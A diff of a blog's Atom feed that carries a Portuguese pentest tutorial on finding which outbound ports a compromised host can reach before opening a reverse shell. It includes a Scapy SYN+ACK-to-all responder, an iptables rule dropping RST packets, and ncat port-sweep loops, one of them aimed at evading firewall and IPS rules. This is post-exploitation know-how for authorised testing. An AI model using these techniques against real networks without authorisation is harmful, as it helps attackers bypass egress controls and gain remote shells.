-&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="hacking-tricks" /><category term="network" /><category term="pentest" /><summary type="html">Sometimes during the daily engagements, we access (e.g. RCE) hosts where we are unable to get a reverse shell on the standard ports due to firewall restrictions. In these cases, we have to find alternative ways to exfiltrate data (e.g. DNS) but, first of all, check if we don’t have access to any port.</summary></entry><entry xml:lang="br"><title type="html">Hacking Tricks: Identificando Portas de Saída para Shell Reversa</title><link href="http://localhost:4000/hacking-tricks/2019/11/05/trick-check-outgoing-ports.html" rel="alternate" type="text/html" title="Hacking Tricks: Identificando Portas de Saída para Shell Reversa" /><published>2019-11-05T00:00:00-03:00</published><updated>2019-11-05T00:00:00-03:00</updated><id>http://localhost:4000/hacking-tricks/2019/11/05/trick-check-outgoing-ports</id><content type="html" xml:base="http://localhost:4000/hacking-tricks/2019/11/05/trick-check-outgoing-ports.html">&lt;p&gt;Algumas vezes durante os projetos do dia-a-dia nos deparamos com acesso (ex: RCE) em que o host afetado que (aparentemente) não possui qualquer liberação de acesso à internet para a nossa boa e velha shell reversa. Dessa forma temos que procurar por alternativas para exfiltrar dados (ex: DNS) ou, antes disso, validar se realmente não temos qualquer acesso à internet.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="hacking-tricks" /><category term="hacking-tricks" /><category term="network" /><category term="pentest" /><summary type="html">Sometimes during the daily engagements, we access (e.g. RCE) hosts where we are unable to get a reverse shell on the standard ports due to firewall restrictions. In these cases, we have to find alternative ways to exfiltrate data (e.g. DNS) but, first of all, check if we don’t have access to any port.</summary></entry><entry xml:lang="br"><title type="html">Hacking Tricks: Identificando Portas de Saída para Shell Reversa</title><link href="http://0.0.0.0:4000/hacking-tricks/2019/11/05/trick-check-outgoing-ports.html" rel="alternate" type="text/html" title="Hacking Tricks: Identificando Portas de Saída para Shell Reversa" /><published>2019-11-05T00:00:00-03:00</published><updated>2019-11-05T00:00:00-03:00</updated><id>http://0.0.0.0:4000/hacking-tricks/2019/11/05/trick-check-outgoing-ports</id><content type="html" xml:base="http://0.0.0.0:4000/hacking-tricks/2019/11/05/trick-check-outgoing-ports.html">&lt;p&gt;Algumas vezes durante os projetos do dia-a-dia nos deparamos com acesso (ex: RCE) em que o host afetado que (aparentemente) não possui qualquer liberação de acesso à internet para a nossa boa e velha shell reversa. Dessa forma temos que procurar por alternativas para exfiltrar dados (ex: DNS) ou, antes disso, validar se realmente não temos qualquer acesso à internet.&lt;/p&gt;
 
 &lt;p&gt;Durante um teste me deparei com essa situação e, para aproveitar minha saudade de codar alguma tool, resolvi implementar uma ferramenta que aceitasse qualquer conexão que viessem (em qualquer porta). Dessa forma é possível identificar se o host comprometido possui alguma exceção no firewall da rede que permita ele sair para a internet.&lt;/p&gt;
 
@@ -132,56 +132,56 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
 
 &lt;h3 id=&quot;trick&quot;&gt;Trick&lt;/h3&gt;
 
-&lt;p&gt;Essa dica se resume basicamente a um código Python que responde &lt;code class=&quot;highlighter-rouge&quot;&gt;SYN+ACK&lt;/code&gt; para qualquer pacote &lt;code class=&quot;highlighter-rouge&quot;&gt;SYN&lt;/code&gt; que recebido. Utilizando a biblioteca Scapy do Python foi possível desenvolver essa técnica com muito pouco esforço, como pode ser visto abaixo:&lt;/p&gt;
+&lt;p&gt;Essa dica se resume basicamente a um código Python que responde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN+ACK&lt;/code&gt; para qualquer pacote &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN&lt;/code&gt; que recebido. Utilizando a biblioteca Scapy do Python foi possível desenvolver essa técnica com muito pouco esforço, como pode ser visto abaixo:&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python3&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# SYN+ACK ALL - Written by Maycon Vitali&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#
+# SYN+ACK ALL - Written by Maycon Vitali
+#
+&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PacketCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&quot;[{}] SYN packet received from {} on port {}. Replying with SYN+ACK...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-                &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Y-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;m-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;[{}] SYN packet received from {} on port {}. Replying with SYN+ACK...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%Y-%m-%d %H:%M:%S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    &lt;span class=&quot;c&quot;&gt;# Create the IP datagram exchanging the source and the destination&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Create the IP datagram exchanging the source and the destination
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     
-    &lt;span class=&quot;c&quot;&gt;# Create the TCP datagrana exchanging the ports annd adjusting the flags&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;# and the seq/ack numbers.&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'SA'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Create the TCP datagrana exchanging the ports annd adjusting the flags
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# and the seq/ack numbers.
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    &lt;span class=&quot;c&quot;&gt;# Do it!&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Do it!
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;c&quot;&gt;# Start the sniffing&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Start the sniffing
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;eth0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;prn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PacketCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(tcp[tcpflags] &amp;amp; tcp-syn != 0)&quot;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Para que o código acima funcione apropriadamente, precisamos de dizer ao Kernel do Linux para não enviar pacotes &lt;code class=&quot;highlighter-rouge&quot;&gt;RST&lt;/code&gt; quando o memso receber uma mensagem &lt;code class=&quot;highlighter-rouge&quot;&gt;SYN&lt;/code&gt; em uma porta não aberta. Isso pode ser feito com o seguinte comando do &lt;code class=&quot;highlighter-rouge&quot;&gt;iptables&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;Para que o código acima funcione apropriadamente, precisamos de dizer ao Kernel do Linux para não enviar pacotes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RST&lt;/code&gt; quando o memso receber uma mensagem &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN&lt;/code&gt; em uma porta não aberta. Isso pode ser feito com o seguinte comando do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt;:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 root@hacknroll:~# iptables -L
 Chain INPUT (policy ACCEPT)
 target     prot opt source               destination
@@ -196,7 +196,7 @@ DROP       tcp  --  anywhere             anywhere             tcp flags:RST/RST
 
 &lt;p&gt;Tendo feito isso, basta executar o nosso script para começar a receber mensagens de conexão do além (aka Internet):&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# ./synack-all.py
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# ./synack-all.py
 [2019-11-05 14:05:12] SYN packet received from 117.xxx.xxx.160 on port 445. Replying with SYN+ACK...
 [2019-11-05 14:05:41] SYN packet received from 193.xxx.xxx.46 on port 445. Replying with SYN+ACK...
 [2019-11-05 14:05:41] SYN packet received from 193.xxx.xxx.46 on port 445. Replying with SYN+ACK...
@@ -217,7 +217,7 @@ DROP       tcp  --  anywhere             anywhere             tcp flags:RST/RST
 
 &lt;p&gt;Agora basta utilizar qualquer artifício que desejar para validar se o script está funcionando corretamente. Abaixo é possível verificar que a porta 80 aparenta estar aberta:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ncat -z -v 68.xxx.xxx.181 80
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ncat -z -v 68.xxx.xxx.181 80
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Connected to 68.xxx.xxx.181:80.
 Ncat: 0 bytes sent, 0 bytes received in 0.24 seconds.
@@ -225,7 +225,7 @@ Ncat: 0 bytes sent, 0 bytes received in 0.24 seconds.
 
 &lt;p&gt;Com pouco esfoço é possível varrer todas as portas e validar quais portas podem sair para a internet e, então, utilizá-las para obter a sua tão sonhada shell reversa:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PORT &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;seq 65535&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 68.xxx.xxx.181 &lt;span class=&quot;nv&quot;&gt;$PORT&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PORT &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;65535&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 68.xxx.xxx.181 &lt;span class=&quot;nv&quot;&gt;$PORT&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done
 &lt;/span&gt;Ncat: Connected to 68.xxx.xxx.181:80.
 Ncat: Connected to 68.xxx.xxx.181:443.
 Ncat: Connected to 68.xxx.xxx.181:3389.
@@ -235,7 +235,7 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
 &lt;p&gt;No caso acima, as portas 80, 443, 3389 (rdp) e 8080 possúem acesso à internet.&lt;/p&gt;
 
 &lt;p&gt;Uma forma de aumentar a velicidade do scan e evatir algumas regras de firewall/ips é utilizar o seguinte trick sugerido pelo &lt;a href=&quot;https://twitter.com/usscastro?lang=pt&quot;&gt;@usscastro&lt;/a&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;seq 65535 | shuf | xargs &lt;span class=&quot;nt&quot;&gt;-P32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;@ sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ncat -z -v 68.xxx.xxx.181 @&quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;65535 | &lt;span class=&quot;nb&quot;&gt;shuf&lt;/span&gt; | xargs &lt;span class=&quot;nt&quot;&gt;-P32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;@ sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ncat -z -v 68.xxx.xxx.181 @&quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected
 Ncat: Connected to 68.xxx.xxx.181:3389.
 Ncat: Connected to 68.xxx.xxx.181:443.
 Ncat: Connected to 68.xxx.xxx.181:80.
@@ -252,7 +252,7 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
 &lt;h3 id=&quot;referências&quot;&gt;Referências&lt;/h3&gt;
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;https://scapy.net&quot;&gt;Scapy Project&lt;/a&gt;&lt;/li&gt;
